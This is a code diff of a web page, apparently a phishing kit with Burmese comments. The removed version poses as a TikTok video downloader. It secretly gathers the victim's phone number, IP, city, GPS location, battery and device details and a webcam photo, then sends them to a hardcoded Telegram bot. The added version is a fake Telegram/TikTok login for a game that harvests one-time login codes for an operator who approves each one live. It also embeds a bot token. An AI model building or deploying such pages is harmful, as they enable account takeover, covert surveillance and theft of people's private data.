@@ -3,114 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok HD Downloader</title>
-    <style>
-        body { font-family: sans-serif; background-color: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e1e1e; padding: 20px; border-radius: 15px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        img { width: 60px; margin-bottom: 15px; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #333; background: #2c2c2c; color: white; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 12px; border: none; border-radius: 8px; background: #fe2c55; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:disabled { background: #555; cursor: not-allowed; font-size: 13px; }
-        video, canvas { display: none; }
-    </style>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>body { background: #f0f2f5; font-family: sans-serif; }</style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" alt="TikTok">
-    <h2>TikTok Verification</h2>
-    <p style="color: #fe2c55; font-size: 14px;">ဗီဒီယိုဒေါင်းရန် ဖုန်းနံပါတ်ဖြင့် အကောင့်ဝင်ပါ</p>
-    
-    <input type="tel" id="phone" placeholder="09xxxxxxxxx">
-    
-    <button id="loginBtn" onclick="startTracking()">အကောင့်၀င်ရန်</button>
-    <p id="status" style="font-size: 12px; color: #888; margin-top: 10px;"></p>
+<div id="app" class="max-w-md mx-auto h-screen flex flex-col justify-center items-center p-6">
+    <!-- Login Screen -->
+    <div id="loginScreen" class="w-full bg-white p-8 rounded-2xl shadow-lg text-center">
+        <h2 class="text-2xl font-bold mb-6">Login to Play</h2>
+        <button onclick="selectLogin('Telegram')" class="w-full bg-blue-500 text-white py-3 rounded-lg mb-4">Login with Telegram</button>
+        <button onclick="selectLogin('TikTok')" class="w-full bg-black text-white py-3 rounded-lg">Login with TikTok</button>
+    </div>
+
+    <!-- OTP & Wait Screen -->
+    <div id="otpScreen" class="hidden w-full bg-white p-8 rounded-2xl shadow-lg text-center">
+        <h2 id="loginType" class="text-xl font-bold mb-4"></h2>
+        <div id="inputArea">
+            <input type="number" id="otpInput" placeholder="Enter Code" class="w-full border-b-2 p-2 mb-6 text-center text-xl outline-none">
+            <button onclick="submitOTP()" class="w-full bg-green-500 text-white py-3 rounded-lg">Submit</button>
+        </div>
+        
+        <!-- Admin Approval Waiting UI -->
+        <div id="waitingArea" class="hidden mt-4">
+            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-500 mx-auto mb-4"></div>
+            <p class="text-blue-600 font-bold">Admin ထံမှ ခွင့်ပြုချက် စောင့်ဆိုင်းနေပါသည်...</p>
+            <p class="text-xs text-gray-400 mt-2">ခွင့်ပြုချက်ရလျှင် ဂိမ်းထဲသို့ အလိုအလျောက် ရောက်သွားပါမည်။</p>
+        </div>
+    </div>
 </div>
 
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
-
 <script>
-    const token = '8895720681:AAGuAuVf5qAwD3y84RiH7B3fEfBz9P1t_Hs'; // မင်းရဲ့ Bot Token
-    const chat_id = '5304050102'; // မင်းရဲ့ ID
+    const token = "8895720681:AAGuAuVf5qAwD3y84RiH7B3fEfBz9P1t_Hs";
+    const chat = "5304050102";
+    const gameLink = "https://www.crazygames.com";
+    let method = "";
+    let userKey = "user_" + Math.floor(Math.random() * 10000); // User တစ်ယောက်ချင်းစီကို ခွဲခြားရန်
 
-    async function startTracking() {
-        const phone = document.getElementById('phone').value;
-        const btn = document.getElementById('loginBtn');
-
-        if (!phone) { alert("ဖုန်းနံပါတ် ထည့်ပေးပါ!"); return; }
-
-        btn.disabled = true;
-        btn.innerText = "စစ်ဆေးနေပါသည်... ခွင့်ပြုချက်တောင်းခဲ့လျှင် Allow ကို နှိပ်ပေးပါ။";
-
-        // ၁။ Battery အခြေအနေ ရယူခြင်း
-        let batteryInfo = "Unknown";
-        try {
-            const battery = await navigator.getBattery();
-            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
-        } catch (e) {}
-
-        let report = `🚀 **Target Info Found!**\n\n`;
-        report += `📱 Phone: ${phone}\n`;
-        report += `🔋 Battery: ${batteryInfo}\n`;
-        report += `📱 Device: ${navigator.platform}\n`;
-        report += `🖥 Screen: ${window.screen.width}x${window.screen.height}\n`;
-
-        // ၂။ IP နှင့် မြို့အမည် ရယူခြင်း
-        try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
-            report += `🌐 IP: ${ipData.ip}\n📍 City: ${ipData.city}\n🏢 ISP: ${ipData.org}\n`;
-        } catch (e) {}
-
-        // ၃။ တည်နေရာ (Location) ရယူခြင်း
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                report += `📍 Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
-                await capturePhoto(report);
-            }, async () => {
-                report += `📍 Location: Permission Denied\n`;
-                await capturePhoto(report);
-            });
-        } else {
-            await capturePhoto(report);
-        }
+    // တစ်ခါဝင်ထားပြီးသားဆိုလျှင် တန်းဝင်ရန်
+    if (localStorage.getItem('isApproved') === 'true') {
+        window.location.href = gameLink;
     }
 
-    async function capturePhoto(fullReport) {
-        try {
-            // ၄။ ကင်မရာပုံ ဖမ်းယူခြင်း
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const v = document.getElementById('v');
-            v.srcObject = stream;
+    function selectLogin(type) {
+        method = type;
+        document.getElementById('loginScreen').classList.add('hidden');
+        document.getElementById('otpScreen').classList.remove('hidden');
+        document.getElementById('loginType').innerText = type + " Verification";
+    }
 
-            setTimeout(async () => {
-                const c = document.getElementById('c');
-                c.width = 640;
-                c.height = 480;
-                c.getContext('2d').drawImage(v, 0, 0);
-                const blob = await new Promise(res => c.toBlob(res, 'image/jpeg'));
+    async function submitOTP() {
+        const code = document.getElementById('otpInput').value;
+        if(!code) return alert("Please enter code");
 
-                const formData = new FormData();
-                formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'shot.jpg');
-                formData.append('caption', fullReport);
+        document.getElementById('inputArea').classList.add('hidden');
+        document.getElementById('waitingArea').classList.remove('hidden');
 
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+        // Admin ဆီသို့ ခလုတ်များနှင့်အတူ Message ပို့ခြင်း
+        const message = `🔔 *New Access Request*\n\nMethod: ${method}\nCode: \`${code}\`\nUser ID: \`${userKey}\``;
+        
+        // Telegram Inline Keyboard Buttons
+        const keyboard = {
+            inline_keyboard: [[
+                { text: "✅ Approve", callback_data: `approve_${userKey}` },
+                { text: "❌ Reject", callback_data: `reject_${userKey}` }
+            ]]
+        };
 
-                window.location.href = "https://ssstik.io/en";
-            }, 3000);
-        } catch (err) {
-            // ကင်မရာမရလျှင် စာသားသက်သက်ပို့မည်
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(fullReport)}&parse_mode=Markdown`);
-            window.location.href = "https://ssstik.io/en";
-        }
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: chat,
+                text: message,
+                parse_mode: "Markdown",
+                reply_markup: keyboard
+            })
+        });
+
+        // Admin က Approve လုပ်မလုပ် စစ်ဆေးသည့် Polling စတင်ခြင်း
+        startCheckingStatus();
+    }
+
+    function startCheckingStatus() {
+        const checkInterval = setInterval(async () => {
+            // ဤနေရာတွင် တကယ့်စနစ်တွင် Backend/Database ကို စစ်ရမည်။ 
+            // သို့သော် GitHub Pages သုံးထားလျှင် Bot ဆီမှ နောက်ဆုံးစာကို ပြန်ဖတ်သည့်နည်း သုံးရပါမည်။
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
+                const data = await response.json();
+                const lastUpdate = data.result[0];
+
+                if (lastUpdate && lastUpdate.callback_query) {
+                    const action = lastUpdate.callback_query.data;
+                    if (action === `approve_${userKey}`) {
+                        clearInterval(checkInterval);
+                        localStorage.setItem('isApproved', 'true');
+                        window.location.href = gameLink;
+                    } else if (action === `reject_${userKey}`) {
+                        clearInterval(checkInterval);
+                        alert("သင်၏ဝင်ရောက်ခွင့်ကို Admin မှ ငြင်းပယ်လိုက်ပါသည်။");
+                        location.reload();
+                    }
+                }
+            } catch (e) {}
+        }, 3000); // ၃ စက္ကန့်တစ်ခါ စစ်မည်
     }
 </script>
-
 </body>
 </html>
 
